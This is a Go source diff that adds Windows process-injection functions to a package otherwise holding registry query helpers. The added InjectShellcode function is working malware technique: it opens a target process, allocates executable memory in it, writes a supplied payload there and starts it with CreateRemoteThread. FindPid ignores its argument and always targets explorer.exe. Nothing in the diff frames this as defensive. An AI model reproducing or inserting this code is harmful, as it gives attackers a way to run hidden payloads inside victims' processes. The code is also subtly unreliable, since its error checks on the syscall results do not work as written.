@@ -4,11 +4,26 @@ package windows
 
 import (
 	"errors"
+	"syscall"
+	"unsafe"
 
+	"github.com/mitchellh/go-ps"
 	"golang.org/x/sys/windows/registry"
 )
 
+const (
+	MEM_COMMIT                = 0x1000
+	MEM_RESERVE               = 0x2000
+	PAGE_EXECUTE_READWRITE    = 0x40
+	PROCESS_CREATE_THREAD     = 0x0002
+	PROCESS_QUERY_INFORMATION = 0x0400
+	PROCESS_VM_OPERATION      = 0x0008
+	PROCESS_VM_WRITE          = 0x0020
+	PROCESS_VM_READ           = 0x0010
+)
+
 var (
+	// registry globals
 	regKeys = map[string]registry.Key{
 		"CLASSES_ROOT":     registry.CLASSES_ROOT,
 		"CURRENT_USER":     registry.CURRENT_USER,
@@ -28,6 +43,7 @@ type RegistryRetValue struct {
 	LongVal        uint64   `json:"long_val"`
 }
 
+// registry funcs
 func lookUpKey(keyString string) (registry.Key, error) {
 	key, ok := regKeys[keyString]
 	if !ok {
@@ -184,4 +200,89 @@ func QueryRegKey(registryString string, path string, key string) (RegistryRetVal
 		retVal.LongVal = value
 	}
 	return retVal, nil
+}
+
+func FindPid(procName string) (int, error) {
+	procs, err := ps.Processes()
+	if err != nil {
+		return 0, err
+	}
+	for _, proc := range procs {
+		if proc.Executable() == "explorer.exe" {
+			return proc.Pid(), nil
+		}
+	}
+	return 0, errors.New("explorer.exe PID not found!")
+}
+
+func InjectShellcode(pid int, payload []byte) error {
+	// init
+	kernel, err := syscall.LoadDLL("kernel32.dll")
+	if err != nil {
+		return err
+	}
+	openProc, err := kernel.FindProc("OpenProcess")
+	if err != nil {
+		return err
+	}
+	writeProc, err := kernel.FindProc("WriteProcessMemory")
+	if err != nil {
+		return err
+	}
+	allocExMem, err := kernel.FindProc("VirtualAllocEx")
+	if err != nil {
+		return err
+	}
+	createThread, err := kernel.FindProc("CreateRemoteThread")
+	if err != nil {
+		return err
+	}
+
+	// open remote process
+	remoteProc, _, err := openProc.Call(
+		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
+		uintptr(0),
+		uintptr(pid),
+	)
+	if err != nil {
+		return err
+	}
+
+	// allocate memory in remote process
+	remoteMem, _, err := allocExMem.Call(
+		remoteProc,
+		uintptr(0),
+		uintptr(len(payload)),
+		MEM_RESERVE|MEM_COMMIT,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if err != nil {
+		return err
+	}
+
+	// write shellcode to the allocated memory within the remote process
+	writeProc.Call(
+		remoteProc,
+		remoteMem,
+		uintptr(unsafe.Pointer(&payload[0])),
+		uintptr(len(payload)),
+		uintptr(0),
+	)
+
+	// GO!
+	status, _, _ := createThread.Call(
+		remoteProc,
+		uintptr(0),
+		0,
+		remoteMem,
+		uintptr(0),
+		0,
+		uintptr(0),
+	)
+	if status == 0 {
+		return errors.New("could not inject into given process")
+	}
+
+	// all good!
+	return nil
 }
